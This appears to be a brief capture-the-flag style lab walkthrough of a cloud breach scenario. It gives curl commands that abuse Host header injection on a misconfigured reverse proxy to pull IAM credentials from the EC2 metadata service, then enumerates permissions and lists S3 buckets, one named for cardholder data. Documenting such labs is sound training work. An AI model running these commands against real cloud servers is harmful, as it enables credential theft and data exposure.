--------------

### Cloud Breach

--------------

- We have a ec2 server-ip
- The reverse proxy is misconfigured which allows to inject the host header and make a call to internal hosts.Using curl to grab access tokens


```bash
#Finding username
curl x.x.x.x/latest/meta-data/iam/security-credentials/ -H "Host: 169.254.169.254"
#grabbing key
curl x.x.x.x/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-*/ -H "Host: 169.254.169.254"

```

<img width="1885" height="435" alt="image" src="https://github.com/user-attachments/assets/169cdb99-d5d2-4df6-80aa-518422c8d91f" />

- Running `enumerate-iam` shows that we can list buckets

<img width="1878" height="467" alt="image" src="https://github.com/user-attachments/assets/77a8b625-f91a-4905-ad9e-e6df03c350e0" />

- Listing s3 buckets and getting info-:

```bash
aws s3 ls  --profile cloud_breach
 aws s3 ls s3://cg-cardholder-data-bucket-cgid* --profile cloud_breach
```
<img width="892" height="228" alt="image" src="https://github.com/user-attachments/assets/78138d3a-4eab-407c-b25f-f6b639593229" />
